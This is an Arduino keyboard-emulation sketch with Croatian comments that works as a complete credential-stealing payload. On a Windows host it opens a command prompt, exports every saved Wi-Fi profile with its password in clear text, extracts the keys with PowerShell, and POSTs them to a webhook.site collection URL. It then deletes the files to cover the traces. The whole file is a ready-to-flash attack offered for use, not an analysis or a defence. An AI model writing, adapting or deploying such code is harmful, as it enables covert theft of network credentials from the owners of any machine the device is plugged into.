#include <Keyboard.h>

void setup() {
  Keyboard.begin(); // Inicijalizacija tipkovnice
  delay(2000); // Čekanje da računalo prepozna Arduino
}

void loop() {
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI); // Pritisak na Windows tipku
  Keyboard.press('r'); // Pritisak na tipku 'r'
  Keyboard.releaseAll(); // Puštanje svih tipki
  delay(100);
  Keyboard.print("cmd"); // Unos "cmd" za otvaranje naredbenog retka
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(500);
  Keyboard.print("netsh wlan export profile key=clear"); // Naredba 1
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(500);
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); // Naredba 2
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(500);
  Keyboard.print("powershell Invoke-WebRequest -Uri \"https://webhook.site/edface2d-10a8-468e-9404-510fc19647c4\" -Method POST -InFile \"Wi-Fi-PASS\""); // Naredba 3
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(500);
  Keyboard.print("del Wi-* /s /f /q"); // Naredba 4
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(100);
  Keyboard.print("exit"); // Izlaz iz naredbenog retka
  Keyboard.press(KEY_RETURN); // Pritisak na Enter tipku
  Keyboard.release(KEY_RETURN); // Puštanje Enter tipke
  delay(100);
  
  digitalWrite(LED_BUILTIN, HIGH); // Uključivanje LED-ice kada program završi
  delay(90000);
  digitalWrite(LED_BUILTIN, LOW);
  delay(5000);
}
